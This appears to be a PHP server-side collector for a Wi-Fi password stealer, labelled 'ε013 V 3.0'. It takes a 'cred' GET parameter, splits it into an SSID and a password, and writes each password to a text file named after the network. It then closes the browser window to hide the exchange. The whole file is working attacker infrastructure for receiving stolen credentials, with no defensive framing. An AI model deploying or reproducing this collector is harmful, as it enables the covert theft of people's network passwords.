<?php

//////////////////////////////////////////////
//            ε013 V 3.0 (HTTP)
//          Jordan Dalcq - 0v3rl0w
/////////////////////////////////////////////


$cred = htmlspecialchars($_GET["cred"]);
$ssid = substr(explode(",", $cred)[0], 0, -2);
$pass = substr(explode(",", $cred)[1], 0, -2);

if(file_exists(sprintf("%s.txt", $ssid))) {
  $add = 1;

  while(file_exists(sprintf("%s-%d.txt", $ssid, $add))) {
    $add++;
  }

  $ssid .= $add;
}

file_put_contents(sprintf("%s.txt", $ssid), $pass);

?>

<script>
  window.close();
</script>
